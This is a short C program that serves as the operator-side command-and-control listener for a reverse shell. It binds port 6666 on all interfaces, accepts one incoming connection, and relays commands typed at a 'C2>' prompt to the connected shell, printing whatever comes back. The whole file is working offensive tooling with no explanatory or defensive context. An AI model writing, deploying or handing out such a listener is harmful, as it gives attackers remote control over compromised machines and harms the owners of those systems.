#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 6666
#define BUFFER_SIZE 1024

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};
    char command[BUFFER_SIZE];

    // 1. Create server socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // 2. Configure server address
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;  // Listen on all available interfaces
    address.sin_port = htons(PORT);

    // 3. Bind the socket to the specified port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // 4. Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    printf("Waiting for connection on port %d...\n", PORT);

    // 5. Accept an incoming connection
    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    if (new_socket < 0) {
        perror("Accept failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    printf("Connection accepted from %s:%d\n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));

    // 6. Loop to communicate with the reverse shell
    while (1) {
        // Clear the command and buffer
        memset(command, 0, BUFFER_SIZE);
        memset(buffer, 0, BUFFER_SIZE);

        // 7. Get command input from the C2 operator (you)
        printf("C2> ");
        fgets(command, BUFFER_SIZE, stdin);  // Read input from C2 operator
        command[strcspn(command, "\n")] = 0;  // Remove newline character

        // 8. Send the command to the reverse shell
        if (send(new_socket, command, strlen(command), 0) < 0) {
            perror("Send failed");
            break;
        }

        // 9. Exit if the operator typed "exit"
        if (strcmp(command, "exit") == 0) {
            printf("Closing connection...\n");
            break;
        }

        // 10. Receive and print the output from the reverse shell
        int bytes_received = recv(new_socket, buffer, BUFFER_SIZE, 0);
        if (bytes_received > 0) {
            printf("%s\n", buffer);  // Print the shell output
        } else {
            printf("Connection closed by the reverse shell.\n");
            break;
        }
    }

    // 11. Close the socket
    close(new_socket);
    close(server_fd);

    return 0;
}
